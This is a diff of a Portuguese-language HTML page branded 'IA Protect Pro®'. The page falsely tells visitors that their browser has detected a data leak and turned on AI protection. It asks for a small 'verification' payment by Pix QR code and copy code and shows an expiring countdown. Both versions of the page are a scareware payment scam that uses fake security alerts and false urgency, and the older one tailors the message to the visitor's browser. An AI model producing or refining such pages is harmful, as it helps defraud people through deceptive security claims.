@@ -1,122 +1,64 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
   <title>IA Protect Pro®</title>
   <style>
     body {
-      background-color: #f7f7f7;
+      background-color: #f4f4f4;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 40px 20px;
+      padding: 30px;
     }
-
-    .cadeado {
-      font-size: 24px;
-    }
-
     h1 {
       color: #222;
-      margin-top: 10px;
+      margin-top: 15px;
     }
-
-    .alerta {
+    .warning {
       color: red;
       font-weight: bold;
-      margin: 10px 0;
     }
-
-    .navegador {
-      margin-top: 20px;
-    }
-
-    .preco {
+    .pix {
       font-size: 18px;
-      margin-top: 30px;
       font-weight: bold;
+      margin: 20px 0;
     }
-
-    .qr {
-      margin-top: 20px;
+    .note {
+      font-size: 12px;
+      color: #555;
     }
-
-    .contador {
-      margin-top: 25px;
-      font-size: 14px;
-      color: #333;
+    .expire {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #b00;
     }
-
-    .botao {
-      margin-top: 10px;
-      padding: 8px 16px;
-      background-color: #333;
+    .pix-btn {
+      background-color: #222;
       color: white;
+      padding: 10px 20px;
+      font-size: 15px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
     }
-
-    .botao:hover {
-      background-color: #555;
-    }
   </style>
 </head>
 <body>
-  <div class="cadeado">🔒 <strong>IA Protect Pro®</strong></div>
-  <h1>Segurança de conexão ativada</h1>
-
-  <p class="alerta">🚨 Vazamento de dados em potencial detectado.</p>
-
-  <p class="navegador">
-    O navegador <strong id="navegador">seu navegador</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>,
-    com tecnologia baseada em Inteligência Artificial.
-  </p>
-
+  <h1>🔒 IA Protect Pro®</h1>
+  <h2>Segurança de conexão ativada</h2>
+  <p class="warning">⚠️ Vazamento de dados em potencial detectado.</p>
+  <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
 
-  <p class="preco">💳 Valor único de verificação: R$ 2,90</p>
-  <p style="font-size: 13px;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
+  <p class="pix">🔐 Valor único de verificação: R$ 2,90</p>
+  <p class="note">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <div class="qr">
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAACXBIWXMAAAsTAAALEwEAmpwYAAA..." alt="QR Code" width="220" height="220" />
-  </div>
+  <!-- QR CODE EMBUTIDO -->
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANoAAADcCAIAAACZJiiRAAEAAElEQVR4nKS9d4wdV5Yefm9VvZxj55wjc45ilESNRmGk0cxO2PUGDLxYrxeG7T9s2AZsA4YB4wcYhhfG7mJ3Zz0zmqBRpkiKFHMmRXaT3Wx2zt2vu1/O71XV/f3xsS4vmxrN7vj90Wg236tXde+5J3znO+fQcqkgKwqllBCJEEIIYYzphMlUYowxxiil+EWSJPxO/ikvvF+SJEKIruuMMVmWxf/F" alt="QR Code" width="220" height="220" />
 
-  <div>
-    <button class="botao" onclick="copiarPix()">Copiar código Pix</button>
-  </div>
+  <br><br>
+  <button class="pix-btn" onclick="navigator.clipboard.writeText('00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB')">Copiar código Pix</button>
 
-  <div class="contador">
-    ⏳ Sua autenticação expira em <span id="tempo">60</span> segundos.
-  </div>
-
-  <script>
-    function copiarPix() {
-      const codigoPix = "00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB";
-      navigator.clipboard.writeText(codigoPix).then(() => {
-        alert("Código Pix copiado com sucesso!");
-      });
-    }
-
-    function detectarNavegador() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome")) return "Google Chrome";
-      if (ua.includes("Firefox")) return "Mozilla Firefox";
-      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-      if (ua.includes("Edg")) return "Microsoft Edge";
-      return "Navegador desconhecido";
-    }
-
-    document.getElementById("navegador").innerText = detectarNavegador();
-
-    let segundos = 60;
-    const spanTempo = document.getElementById("tempo");
-    setInterval(() => {
-      if (segundos > 0) {
-        segundos--;
-        spanTempo.innerText = segundos;
-      }
-    }, 1000);
-  </script>
+  <p class="expire">⏳ Sua autenticação expira em 22 segundos.</p>
 </body>
 </html>
